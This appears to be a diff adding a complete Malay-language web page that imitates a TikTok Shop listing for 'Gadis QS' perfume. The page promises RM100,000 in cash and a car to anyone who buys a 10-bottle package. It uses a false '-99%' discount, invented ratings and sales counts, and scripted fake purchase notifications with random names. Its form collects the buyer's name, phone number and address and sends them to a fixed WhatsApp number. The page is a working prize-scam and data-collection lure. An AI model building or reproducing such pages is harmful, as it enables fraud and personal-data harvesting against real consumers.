@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>Gadis QS - Tiktok Shop</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    /* ===== RESET ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Poppins', Arial, sans-serif;
+      background: #f5f5f5;
+      color: #333;
+    }
+
+    /* Sistem ganti halaman */
+    .page {
+      display: none;
+      min-height: 100vh;
+    }
+    .page.active {
+      display: block;
+    }
+
+    /* ===== HALAMAN PRODUK ===== */
+    #produkPage {
+      padding-bottom: 90px;
+    }
+
+    #produkPage .header {
+      background: #fff;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border-bottom: 1px solid #eee;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    #produkPage .header img {
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+    }
+
+    #produkPage .search-bar {
+      flex: 1;
+      padding: 8px 14px;
+      border: 1px solid #ddd;
+      border-radius: 20px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    #produkPage .slider {
+      width: 100%;
+      overflow: hidden;
+      background: #fff;
+    }
+
+    #produkPage .slides {
+      display: flex;
+      overflow-x: auto;
+      scroll-snap-type: x mandatory;
+      -webkit-overflow-scrolling: touch;
+      scrollbar-width: none;
+    }
+    #produkPage .slides::-webkit-scrollbar {
+      display: none;
+    }
+
+    #produkPage .slides img {
+      width: 100%;
+      flex-shrink: 0;
+      scroll-snap-align: start;
+      object-fit: cover;
+    }
+
+    #produkPage .tags {
+      display: flex;
+      background: #fff;
+      padding: 10px;
+      gap: 6px;
+      border-bottom: 1px solid #eee;
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+    #produkPage .tags::-webkit-scrollbar {
+      display: none;
+    }
+
+    #produkPage .tag {
+      padding: 6px 10px;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 12px;
+      white-space: nowrap;
+    }
+    #produkPage .tag1 { background: #00bcd4; }
+    #produkPage .tag2 { background: #4caf50; }
+    #produkPage .tag3 { background: #ff9800; }
+    #produkPage .tag4 { background: #e91e63; margin-left: auto; }
+
+    #produkPage .price-section {
+      background: #fff;
+      padding: 15px;
+      border-bottom: 1px solid #eee;
+    }
+
+    #produkPage .discount-badge {
+      background: #ff4081;
+      color: #fff;
+      padding: 3px 6px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-right: 6px;
+    }
+
+    #produkPage .current-price {
+      font-size: 24px;
+      font-weight: 700;
+      color: #ff0000;
+      margin-right: 10px;
+    }
+
+    #produkPage .original-price {
+      font-size: 14px;
+      color: #999;
+      text-decoration: line-through;
+    }
+
+    #produkPage .price-notes {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 8px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    #produkPage .product-info {
+      background: #fff;
+      padding: 15px;
+      border-bottom: 1px solid #eee;
+    }
+
+    #produkPage .power-shop {
+      color: #ff9800;
+      font-size: 12px;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    #produkPage .product-name {
+      font-size: 15px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      white-space: pre-line;
+    }
+
+    #produkPage .rating {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 14px;
+      color: #666;
+    }
+    #produkPage .rating span {
+      color: #ffc107;
+    }
+
+    #produkPage .shipping {
+      background: #fff;
+      padding: 15px;
+      border-bottom: 1px solid #eee;
+      font-size: 14px;
+    }
+
+    #produkPage .product-detail {
+      background: #fff;
+      margin-top: 10px;
+      border-top: 8px solid #f5f5f5;
+    }
+
+    #produkPage .detail-header {
+      padding: 15px;
+      font-weight: 700;
+      font-size: 16px;
+      border-bottom: 1px solid #eee;
+    }
+
+    #produkPage .accordion {
+      border-bottom: 1px solid #eee;
+    }
+
+    #produkPage .accordion-btn {
+      width: 100%;
+      padding: 15px;
+      text-align: left;
+      background: #fff;
+      border: none;
+      font-size: 14px;
+      font-weight: 600;
+      display: flex;
+      justify-content: space-between;
+      cursor: pointer;
+    }
+
+    #produkPage .accordion-content {
+      max-height: 0;
+      overflow: hidden;
+      transition: 0.3s ease;
+      padding: 0 15px;
+      color: #555;
+      line-height: 1.6;
+      font-size: 14px;
+    }
+
+    #produkPage .accordion.active .accordion-content {
+      max-height: 500px;
+      padding: 0 15px 15px;
+    }
+
+    #produkPage .bottom-nav {
+      background: #fff;
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-top: 1px solid #eee;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      gap: 10px;
+      box-shadow: 0 -2px 8px rgba(0,0,0,0.05);
+    }
+
+    #produkPage .nav-item {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      flex: 1;
+      cursor: pointer;
+    }
+
+    #produkPage .nav-item img {
+      width: 24px;
+      height: 24px;
+      margin-bottom: 3px;
+    }
+
+    #produkPage .buy-btn {
+      background: #4caf50;
+      color: #fff;
+      border: none;
+      padding: 14px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      flex: 2;
+      cursor: pointer;
+    }
+
+    /* ===== HALAMAN CHECKOUT ===== */
+    #checkoutPage {
+      background: linear-gradient(135deg, #00a000, #ff9, #ff1010);
+      padding: 12px 12px 90px;
+    }
+
+    #checkoutPage .address-section,
+    #checkoutPage .product-section,
+    #checkoutPage .tiktok-discount,
+    #checkoutPage .summary-section {
+      background: #fff;
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 12px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+    }
+
+    #checkoutPage .shop-info {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+
+    #checkoutPage .power-shop {
+      background: #ff9800;
+      color: #fff;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    #checkoutPage .product-details {
+      display: flex;
+      gap: 12px;
+    }
+
+    #checkoutPage .product-img {
+      width: 80px;
+      height: 80px;
+      border-radius: 8px;
+      object-fit: cover;
+    }
+
+    #checkoutPage .product-info {
+      flex: 1;
+    }
+
+    #checkoutPage .product-name {
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #333;
+    }
+
+    #checkoutPage .current-price {
+      font-size: 16px;
+      font-weight: 700;
+      color: #ff0000;
+      margin-right: 6px;
+    }
+
+    #checkoutPage .original-price {
+      font-size: 12px;
+      color: #999;
+      text-decoration: line-through;
+      margin-right: 6px;
+    }
+
+    #checkoutPage .discount-badge {
+      background: #ff4081;
+      color: #fff;
+      padding: 2px 5px;
+      border-radius: 4px;
+      font-size: 10px;
+      font-weight: 700;
+    }
+
+    #checkoutPage .order-fixed {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: #fff;
+      padding: 12px;
+      box-shadow: 0 -2px 8px rgba(0,0,0,0.1);
+    }
+
+    #checkoutPage .order-btn {
+      width: 100%;
+      background: #4caf50;
+      color: #fff;
+      border: none;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    #checkoutPage .processor {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      margin-top: 8px;
+    }
+
+    /* ===== HALAMAN BAYAR ===== */
+    #bayarPage {
+      background: linear-gradient(135deg, #ff1010, #ff0, #00c14f);
+      min-height: 100vh;
+    }
+
+    #bayarPage .wrapper {
+      max-width: 420px;
+      margin: auto;
+      padding: 20px 15px 40px;
+    }
+
+    #bayarPage .qr-container {
+      background: #fff;
+      padding: 25px;
+      border-radius: 18px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    #bayarPage .qr-title {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    #bayarPage .qr-sub {
+      font-size: 13px;
+      color: #777;
+      margin-bottom: 12px;
+    }
+
+    #bayarPage .promo-banner {
+      background: #ff3b3b;
+      color: #fff;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 8px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+
+    #bayarPage .package-item {
+      background: #f8f8f8;
+      padding: 12px;
+      border-radius: 12px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      border: 2px solid transparent;
+      position: relative;
+      font-size: 14px;
+    }
+
+    #bayarPage .package-item.active {
+      border-color: #00b14f;
+      background: #e6fff0;
+    }
+
+    #bayarPage .radio {
+      position: absolute;
+      right: 12px;
+      top: 12px;
+      width: 18px;
+      height: 18px;
+      border: 2px solid #aaa;
+      border-radius: 50%;
+    }
+
+    #bayarPage .package-item.active .radio {
+      border-color: #00b14f;
+      background: #00b14f;
+    }
+
+    #bayarPage .badge {
+      background: #ffcc00;
+      color: #000;
+      font-size: 11px;
+      padding: 4px 8px;
+      border-radius: 6px;
+      display: inline-block;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+
+    #bayarPage .top-bar {
+      margin: 15px 0;
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(10px);
+      color: #fff;
+      padding: 12px;
+      border-radius: 12px;
+      display: flex;
+      justify-content: space-between;
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    #bayarPage .form-container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    #bayarPage .form-header {
+      text-align: center;
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 20px;
+    }
+
+    #bayarPage .form-group {
+      margin-bottom: 15px;
+    }
+
+    #bayarPage .label {
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    #bayarPage .input-field {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      font-size: 14px;
+      outline: none;
+    }
+
+    #bayarPage .phone-container {
+      display: flex;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    #bayarPage .country-code {
+      padding: 12px;
+      background: #f2f2f2;
+      font-weight: 600;
+    }
+
+    #bayarPage .phone-input {
+      flex: 1;
+      border: none;
+      padding: 12px;
+      outline: none;
+    }
+
+    #bayarPage .save-btn {
+      width: 100%;
+      background: linear-gradient(135deg, #00b14f, #00d563);
+      border: none;
+      padding: 15px;
+      border-radius: 12px;
+      color: #fff;
+      font-weight: 700;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    #bayarPage .privacy-note {
+      font-size: 12px;
+      color: #777;
+      text-align: center;
+      margin: 15px 0;
+    }
+
+    #bayarPage .popup {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      background: #fff;
+      padding: 12px 15px;
+      border-radius: 10px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      font-size: 12px;
+      max-width: 250px;
+      display: none;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- PAGE 1: PRODUK -->
+  <div id="produkPage" class="page active">
+    <div class="header">
+      <img src="https://i.supaimg.com/2dd5a784-1278-4cb3-a74c-3c82defb37f0/dce5c044-efd6-44c5-97f3-9ae8142c3ffd.jpg" alt="Back">
+      <input type="text" class="search-bar" placeholder="Cari produk...">
+      <img src="https://cdn-icons-png.flaticon.com/512/291/291643.png" alt="Share">
+      <img src="https://cdn-icons-png.flaticon.com/512/3144/3144456.png" alt="Cart">
+      <img src="https://cdn-icons-png.flaticon.com/512/1828/1828818.png" alt="More">
+    </div>
+
+    <div class="slider">
+      <div class="slides">
+        <img src="https://i.supaimg.com/9dd0407e-c134-4311-9a7b-f76a14bf8bc4/cfa97d97-517a-4b0a-9667-fe3d845e6bd8.jpg" alt="Produk 1">
+        <img src="https://i.supaimg.com/8d8883ae-ac11-44bf-8b32-ec2d5b440257/71e1599b-3d82-4eb0-8a7e-4d89d17da704.jpg" alt="Produk 2">
+        <img src="https://i.supaimg.com/8d8883ae-ac11-44bf-8b32-ec2d5b440257/59a74570-9dac-4aff-abdd-d748fbc42275.jpg" alt="Produk 3">
+      </div>
+    </div>
+
+    <div class="tags">
+      <div class="tag tag1">XTRA Percuma hantaran</div>
+      <div class="tag tag2">Hadiah 100K & 250K</div>
+      <div class="tag tag3">Jimat dgn bonus</div>
+      <div class="tag tag4">Sisa Kuota(125)</div>
+    </div>
+
+    <div class="price-section">
+      <span class="discount-badge">-99%</span>
+      <span class="current-price">RM300</span>
+      <span class="original-price">RM350.00</span>
+      <div class="price-notes">
+        <span>Pakej Combo</span>
+        <span>Dapat hadiah RM100,000</span>
+        <span>+ Toyota Alphard / HONDA HR-V RS</span>
+      </div>
+    </div>
+
+    <div class="product-info">
+      <div class="power-shop">Gadis QS Official</div>
+      <div class="product-name">TAWARAN MEGA GADIS QS: BELI & MENANG KERETA IDAMAN!
+Impian anda untuk memiliki kereta baharu dan wang tunai kini boleh jadi kenyataan! Hanya dengan membuat pembelian 10 botol perfume extrait Gadis QS Original, anda secara automatik layak dan berhak untuk membawa pulang:
+🚘 Hadiah Utama: Sebuah kereta Honda HR-V yang serba mewah!
+💰 Wang Tunai: Sebanyak RM100,000 menanti anda!
+Jangan lepaskan peluang keemasan. Ganjaran lumayan menanti. Dapatkan 10 pek anda sekarang di WhatsApp Rasmi Gadis.</div>
+      <div class="rating"><span>★</span> 4.6 (98) | 568 terjual</div>
+    </div>
+
+    <div class="shipping">
+      <p><strong>Penghantaran percuma disediakan,</strong> dan hadiah akan dihantar terus ke hadapan rumah pelanggan.</p>
+    </div>
+
+    <div class="product-detail">
+      <div class="detail-header">Butiran Produk - QS Perfume</div>
+      <div class="accordion">
+        <button class="accordion-btn">Spesifikasi Produk <span>›</span></button>
+        <div class="accordion-content">
+          <p><strong>Nama:</strong> QS Perfume - Scandaluxx Extrait</p>
+          <p><strong>Isi:</strong> 10 Botol</p>
+          <p><strong>Isi per botol:</strong> 30ml</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bottom-nav">
+      <div class="nav-item" onclick="window.open('https://cacaalina78-tech.github.io/Aa/', '_self');">
+        <img src="https://cdn-icons-png.flaticon.com/512/1057/1057863.png" alt="Testi">
+        <div>Testimoni</div>
+      </div>
+      <div class="nav-item" onclick="window.open('https://solima33444.github.io/Sr/', '_self');">
+        <img src="https://cdn-icons-png.flaticon.com/512/3144/3144456.png" alt="Cart">
+        <div>Keranjang</div>
+      </div>
+      <button class="buy-btn" onclick="showPage('checkoutPage')">Beli Sekarang</button>
+    </div>
+  </div>
+
+  <!-- PAGE 2: CHECKOUT -->
+  <div id="checkoutPage" class="page">
+    <div class="address-section">
+      <a href="#" onclick="showPage('produkPage')">
+        <img src="https://i.supaimg.com/8d8883ae-ac11-44bf-8b32-ec2d5b440257/7dc0b20f-81aa-48cb-9136-928168ea3ac0.jpg" style="width:100%; border-radius:8px;" alt="Address">
+      </a>
+    </div>
+
+    <div class="product-section">
+      <div class="shop-info">
+        <div style="display: flex; align-items: center; gap: 6px;">
+          <div class="power-shop">Kedai Pilihan</div>
+          <div>PAKEJ COMBO 10 BOTOL</div>
+        </div>
+        <div style="font-size:12px;color:#666;cursor:pointer" onclick="showPage('produkPage')">← Kembali</div>
+      </div>
+
+      <div class="product-details">
+        <img src="https://i.supaimg.com/9dd0407e-c134-4311-9a7b-f76a14bf8bc4/cfa97d97-517a-4b0a-9667-fe3d845e6bd8.jpg" class="product-img" alt="Produk">
+        <div class="product-info">
+          <div class="product-name">Pakej Combo 10 BOTOL by GADIS QS. Dapatkan hadiah wang tunai RM100,000. Pesan sekarang.</div>
+          <div style="font-size:12px;color:#666;margin-bottom:5px">🪙 Pemulangan Barang Percuma</div>
+          <div style="display:flex;align-items:center;gap:5px">
+            <span class="current-price">RM300</span>
+            <span class="original-price">RM350</span>
+            <span class="discount-badge">-99%</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tiktok-discount">
+      <span>💳 Diskaun TikTok Shop</span>
+      <span>></span>
+    </div>
+
+    <div class="summary-section">
+      <div style="font-size:16px;font-weight:700;margin-bottom:10px">Notis Rasmi</div>
+      <div style="font-size:14px;margin-bottom:8px">Gadis QS tidak pernah melakukan sebarang pemungutan bayaran berkaitan hadiah yang anda terima.</div>
+      <div style="font-size:14px">Sila buat pesanan untuk menuntut hadiah daripada Gadis QS.</div>
+    </div>
+
+    <div class="order-fixed">
+      <button class="order-btn" onclick="showPage('bayarPage')">Buat Pesanan</button>
+      <div class="processor">Diproses oleh <span>platform</span></div>
+    </div>
+  </div>
+
+  <!-- PAGE 3: PEMBAYARAN -->
+  <div id="bayarPage" class="page">
+    <div class="wrapper">
+      <div class="qr-container">
+        <div class="qr-title">Gadis QS</div>
+        <div class="qr-sub">Pembayaran Selamat & Disahkan</div>
+        <div class="promo-banner">🔴 PROMOSI TERHAD BULAN INI SAHAJA</div>
+
+        <div style="margin-top:15px;text-align:left">
+          <div style="font-size:15px;font-weight:600;margin-bottom:10px">Pilihan Pakej:</div>
+          
+          <div class="package-item" onclick="pilihPakej(this, 'Pakej Biasa RM150')">
+            <div class="radio"></div>
+            • Beli <strong>Pakej Biasa RM150</strong><br>
+            Layak menerima wang tunai RM50,000
+          </div>
+
+          <div class="package-item active" onclick="pilihPakej(this, 'Pakej Sedang RM200')">
+            <div class="radio"></div>
+            <div class="badge">⭐ Paling Popular</div>
+            • Beli <strong>Pakej Sedang RM200</strong><br>
+            Layak menerima wang tunai RM80,000 + peluang Toyota Alphard
+          </div>
+
+          <div class="package-item" onclick="pilihPakej(this, 'Pakej Combo RM300')">
+            <div class="radio"></div>
+            • Beli <strong>Pakej Combo RM300</strong><br>
+            Layak menerima HONDA HR-V RS + peluang RM100,000 - RM250,000
+          </div>
+        </div>
+      </div>
+
+      <div class="top-bar">
+        <div onclick="showPage('checkoutPage')">← Kembali</div>
+        <div>🔥 568 terjual</div>
+        <div>✕</div>
+      </div>
+
+      <div class="form-container">
+        <div class="form-header">Maklumat Penghantaran</div>
+        
+        <div class="form-group">
+          <label class="label">Nama penuh</label>
+          <input type="text" id="nama" class="input-field" placeholder="Masukkan nama penuh">
+        </div>
+
+        <div class="form-group">
+          <label class="label">Nombor telefon</label>
+          <div class="phone-container">
+            <div class="country-code">+60</div>
+            <input type="tel" id="phone" class="phone-input" placeholder="0123456789">
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="label">Alamat penghantaran</label>
+          <input type="text" id="alamat" class="input-field" placeholder="Masukkan alamat penuh">
+        </div>
+
+        <div class="form-group">
+          <label class="label">Butiran tambahan</label>
+          <input type="text" id="detail" class="input-field" placeholder="Contoh: Rumah pagar putih">
+        </div>
+
+        <div class="privacy-note">Maklumat anda adalah sulit dan dilindungi sepenuhnya.</div>
+        <button class="save-btn" onclick="kirimWhatsApp()">Sahkan & Hantar</button>
+      </div>
+
+      <div id="popup" class="popup">
+        <div id="popupText"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Ganti halaman
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // Accordion
+    document.querySelectorAll("#produkPage .accordion-btn").forEach(btn => {
+      btn.addEventListener("click", () => {
+        btn.parentElement.classList.toggle("active");
+      });
+    });
+
+    // Pilih pakej
+    let pakejDipilih = "Pakej Sedang RM200";
+    function pilihPakej(el, pakej) {
+      document.querySelectorAll("#bayarPage .package-item").forEach(i => i.classList.remove("active"));
+      el.classList.add("active");
+      pakejDipilih = pakej;
+    }
+
+    // Kirim WhatsApp
+    function kirimWhatsApp() {
+      const nama = document.getElementById("nama").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const alamat = document.getElementById("alamat").value.trim();
+      const detail = document.getElementById("detail").value.trim();
+
+      if (!nama || !phone || !alamat) {
+        alert("Sila lengkapkan nama, telefon dan alamat.");
+        return;
+      }
+
+      const nomorTujuan = "601163512644";
+      const pesan = `PESAN BARU\nPakej Dipilih: ${pakejDipilih}\nNama: ${nama}\nTelefon: +60${phone}\nAlamat: ${alamat}\nButiran: ${detail}`;
+      window.open(`https://wa.me/${nomorTujuan}?text=${encodeURIComponent(pesan)}`, "_blank");
+    }
+
+    // Popup notifikasi
+    const namaList = ["Ahmad", "Siti", "Rahman", "Nurul", "Faiz", "Aisyah", "Hafiz", "Amira"];
+    const lokasiList = ["Johor", "Selangor", "Kuala Lumpur", "Melaka", "Perak", "Kedah"];
+    const pakejList = ["Pakej Biasa RM150", "Pakej Sedang RM200", "Pakej Combo RM300"];
+
+    function showPopup() {
+      const nama = namaList[Math.floor(Math.random() * namaList.length)];
+      const lokasi = lokasiList[Math.floor(Math.random() * lokasiList.length)];
+      const pakej = pakejList[Math.floor(Math.random() * pakejList.length)];
+      document.getElementById("popupText").innerText = `${nama} dari ${lokasi} telah membuat pembelian (${pakej})`;
+      document.getElementById("popup").style.display = "block";
+      setTimeout(() => { document.getElementById("popup").style.display = "none"; }, 4000);
+    }
+    setInterval(showPopup, 6000);
+  </script>
+</body>
+</html>
